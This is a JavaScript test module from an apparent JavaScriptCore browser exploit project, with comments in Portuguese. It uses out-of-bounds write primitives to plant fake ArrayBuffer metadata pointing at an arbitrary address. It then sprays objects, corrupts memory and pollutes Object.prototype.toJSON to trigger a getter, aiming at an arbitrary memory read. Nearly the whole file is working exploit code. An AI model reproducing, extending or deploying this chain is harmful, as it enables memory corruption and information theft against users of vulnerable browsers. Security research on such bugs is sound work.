// js/script3/testGetterChecksRetypedOOBAB.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // A variável global
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_NAME = "AAAA_VerifyOOBABRetype";
let getter_called_flag_retype_check = false;
let retype_check_results = {};

class MyComplexObjectForRetypeCheck {
    constructor(id) {
        this.id = `MyComplexObj_RetypeCheck-${id}`;
        this.marker = 0xABABABAB;
    }
}

Object.defineProperty(MyComplexObjectForRetypeCheck.prototype, GETTER_NAME, {
    get: function() {
        const GETTER_FNAME = "MyComplexObjectForRetypeCheck.Getter";
        getter_called_flag_retype_check = true;
        logS3(`!!!! GETTER '${GETTER_NAME}' FOI CHAMADO !!!! (this.id: ${this.id})`, "vuln", GETTER_FNAME);
        this.marker = 0xBBBBBBBB;

        retype_check_results = {
            getter_this_id: this.id,
            oob_ab_retyped: false,
            oob_ab_byteLength_in_getter: "N/A",
            dataview_on_oob_ab_created: false,
            dataview_byteLength: "N/A",
            leaked_val_hex: "N/A",
            error: null
        };

        try {
            if (!oob_array_buffer_real) {
                throw new Error("oob_array_buffer_real é nulo/undefined dentro do getter.");
            }
            retype_check_results.oob_ab_byteLength_in_getter = oob_array_buffer_real.byteLength;
            logS3(`   [${GETTER_FNAME}] Dentro do getter. oob_array_buffer_real.byteLength (JS): ${oob_array_buffer_real.byteLength}`, "info", GETTER_FNAME);

            const dv = new DataView(oob_array_buffer_real);
            retype_check_results.dataview_on_oob_ab_created = true;
            retype_check_results.dataview_byteLength = dv.byteLength;
            logS3(`   [${GETTER_FNAME}]   DataView criada sobre oob_array_buffer_real. dv.byteLength (percebido): ${dv.byteLength}`, "info", GETTER_FNAME);

            const leaked_val = dv.getUint32(0, true); // Tenta ler do offset 0 do (potencialmente re-tipado) oob_array_buffer_real
            retype_check_results.leaked_val_hex = toHex(leaked_val);
            logS3(`     LEITURA ESPECULATIVA do oob_array_buffer_real[0]: ${toHex(leaked_val)}`, "critical", GETTER_FNAME);

            // Sucesso se o byteLength da DataView for o tamanho arbitrário que definimos nos metadados sombra
            const expected_retyped_size = parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16) === 0x18 ? 0x100 : 0x200; // Exemplo de tamanho arbitrário
            // A lógica acima para expected_retyped_size precisa ser o valor exato que escrevemos no shadow metadata.
            // Vamos usar o arbitrary_read_size definido na função principal do teste.
            // Esta verificação será feita no chamador. Aqui, apenas registramos.
            if (dv.byteLength !== initial_oob_ab_real_size_before_corruption) { // initial_oob_ab_real_size_before_corruption precisa ser acessível aqui
                 retype_check_results.oob_ab_retyped = true; // Indicador de que o tamanho mudou
            }


        } catch (e_retype) {
            logS3(`     ERRO ao tentar usar oob_array_buffer_real no getter: ${e_retype.name} - ${e_retype.message}`, "error", GETTER_FNAME);
            retype_check_results.error = `${e_retype.name}: ${e_retype.message}`;
        }
        return "getter_executed_retype_check";
    },
    configurable: true,
    enumerable: true
});

// toJSON que usa for...in, para ser colocada em Object.prototype para acionar o getter
export function toJSON_ForInTriggerForGetter() {
    const FNAME_toJSON = "toJSON_ForInTriggerForGetter";
    let returned_payload = { _variant_: FNAME_toJSON, id_at_entry: String(this?.id || "N/A_toJSON_ForIn") };
    let iter_count = 0;
    try {
        for (const prop in this) { // Este loop é para acionar o getter em MyComplexObjectForRetypeCheck
            iter_count++;
            // Acessar this[prop] é o que aciona getters enumeráveis
            // Mas para evitar RangeError se 'this' estiver muito quebrado,
            // apenas o fato de iterar e JSON.stringify tentar obter o valor do getter AAAA_VerifyOOBABRetype
            // já deveria ser suficiente se ele estiver no protótipo do MyComplexObjectForRetypeCheck.
            if (prop === GETTER_NAME) { // Apenas para garantir que o getter seja "tocado"
                const temp = this[prop];
            }
            if (iter_count > 100) break;
        }
    } catch (e) { returned_payload.error_in_loop = `${e.name}: ${e.message}`; }
    returned_payload.iterations = iter_count;
    return returned_payload;
}

let initial_oob_ab_real_size_before_corruption = 0; // Variável de escopo de módulo

export async function executeGetterChecksRetypedOOBABTest() {
    const FNAME_TEST = "executeGetterChecksRetypedOOBABTest";
    logS3(`--- Iniciando Teste: Getter Verifica oob_array_buffer_real "Re-tipado" ---`, "test", FNAME_TEST);
    document.title = `Getter Checks Retyped OOB_AB`;

    // Validações de Config Essenciais
    if (!JSC_OFFSETS.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID || JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID !== 2) {
        logS3(`ERRO: ArrayBuffer_STRUCTURE_ID não é 2. Atualize config.mjs.`, "error", FNAME_TEST); return;
    }
    const shadow_structure_ptr_offset_val = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, 16);
    const shadow_size_offset_val = parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16);
    const shadow_data_ptr_offset_val = parseInt(JSC_OFFSETS.ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START, 16);

    if (isNaN(shadow_structure_ptr_offset_val) || isNaN(shadow_size_offset_val) || isNaN(shadow_data_ptr_offset_val)) {
        logS3("ERRO: Offsets críticos do ArrayBuffer não são números válidos em config.mjs.", "error", FNAME_TEST); return;
    }

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST); return;
    }
    initial_oob_ab_real_size_before_corruption = oob_array_buffer_real.byteLength; // Salva o tamanho original

    // 1. Construir "Metadados Sombra" no INÍCIO DO CONTEÚDO do oob_array_buffer_real
    const SHADOW_AB_CONTENT_OFFSET = 0x0;
    const shadow_structure_id_val = JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
    const target_arbitrary_read_address = new AdvancedInt64("0x0002000000000000"); // Endereço de leitura alvo
    const arbitrary_read_size = 0x200; // Tamanho da leitura alvo

    logS3(`1. Escrevendo "Metadados Sombra" para oob_array_buffer_real em seu conteúdo [${toHex(SHADOW_AB_CONTENT_OFFSET)}]...`, "info", FNAME_TEST);
    oob_write_absolute(SHADOW_AB_CONTENT_OFFSET + 0x0, shadow_structure_id_val, 4);
    oob_write_absolute(SHADOW_AB_CONTENT_OFFSET + shadow_structure_ptr_offset_val, AdvancedInt64.Zero, 8);
    oob_write_absolute(SHADOW_AB_CONTENT_OFFSET + shadow_size_offset_val, arbitrary_read_size, 4);
    oob_write_absolute(SHADOW_AB_CONTENT_OFFSET + shadow_data_ptr_offset_val, target_arbitrary_read_address, 8);
    logS3("   Metadados Sombra escritos.", "good", FNAME_TEST);

    // 2. Pulverizar MyComplexObjectForRetypeCheck
    const spray_count = 5;
    const sprayed_objects = [];
    logS3(`2. Pulverizando ${spray_count} instâncias de MyComplexObjectForRetypeCheck...`, "info", FNAME_TEST);
    for (let i = 0; i < spray_count; i++) {
        sprayed_objects.push(new MyComplexObjectForRetypeCheck(i));
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    // 3. Realizar a corrupção OOB "gatilho"
    const corruption_offset_trigger = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const corruption_value_trigger = 0xFFFFFFFF;
    logS3(`3. Escrevendo valor trigger ${toHex(corruption_value_trigger)} em oob_ab_real[${toHex(corruption_offset_trigger)}]...`, "warn", FNAME_TEST);
    oob_write_absolute(corruption_offset_trigger, corruption_value_trigger, 4);

    await PAUSE_S3(SHORT_PAUSE_S3);

    // 4. Poluir Object.prototype.toJSON e tentar acionar o getter
    const ppKey_val = 'toJSON';
    let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let problem_detected = false;

    getter_called_flag_retype_check = false;
    retype_check_results = {};

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_ForInTriggerForGetter,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;
        logS3(`4. Object.prototype.toJSON poluído com ${toJSON_ForInTriggerForGetter.name}.`, "info", FNAME_TEST);

        const obj_to_probe = sprayed_objects[0];
        logS3(`5. Sondando objeto ${obj_to_probe.id}... ESPERANDO ACIONAMENTO DO GETTER.`, 'warn', FNAME_TEST);
        document.title = `Sondando ${obj_to_probe.id} (GetterRetypeCheck)`;
        try {
            const stringifyResult = JSON.stringify(obj_to_probe);
            logS3(`   JSON.stringify(${obj_to_probe.id}) completou. Retorno toJSON: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST);

        } catch (e_str) {
            logS3(`   !!!! ERRO AO STRINGIFY ${obj_to_probe.id} !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error", FNAME_TEST);
            problem_detected = true;
            document.title = `ERROR Stringify ${obj_to_probe.id}`;
        }
    } catch (e_main) {
        logS3(`Erro principal no teste: ${e_main.message}`, "error", FNAME_TEST);
        problem_detected = true;
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (getter_called_flag_retype_check) {
        logS3("--- RESULTADOS DO GETTER ---", "test", FNAME_TEST);
        logS3(JSON.stringify(retype_check_results, null, 2), "leak", FNAME_TEST);
        if (retype_check_results.oob_ab_retyped && retype_check_results.dataview_byteLength === arbitrary_read_size) {
            logS3("   !!!! SUCESSO !!!! oob_array_buffer_real PARECE TER SIDO RE-TIPADO CORRETAMENTE!", "critical", FNAME_TEST);
            logS3(`     Leitura de ${target_arbitrary_read_address.toString(true)} (via oob_ab[0]) = ${retype_check_results.leaked_val_hex}`, "critical", FNAME_TEST);
            document.title = "SUCCESS: OOB_AB Retyped & Arbitrary Read!";
        } else if (retype_check_results.dataview_byteLength !== initial_oob_ab_real_size_before_corruption) {
             logS3(`   AVISO: oob_array_buffer_real.byteLength DENTRO DO GETTER (${retype_check_results.dataview_byteLength}) é diferente do original (${initial_oob_ab_real_size_before_corruption}) mas não o esperado (${arbitrary_read_size}).`, "warn", FNAME_TEST);
        }
         else {
            logS3("   Getter acionado, mas oob_array_buffer_real não parece ter sido re-tipado para o tamanho/ponteiro arbitrário.", "warn", FNAME_TEST);
        }
    } else if (!problem_detected) {
        logS3("Getter não foi acionado, mas nenhum erro explícito ocorreu.", "warn", FNAME_TEST);
    }


    clearOOBEnvironment();
    logS3(`--- Teste Getter Verifica oob_array_buffer_real "Re-tipado" CONCLUÍDO ---`, "test", FNAME_TEST);
    if (!document.title.includes("SUCCESS") && !document.title.includes("ERROR")) {
        document.title = `GetterChecksRetypedOOBAB Done`;
    }
}
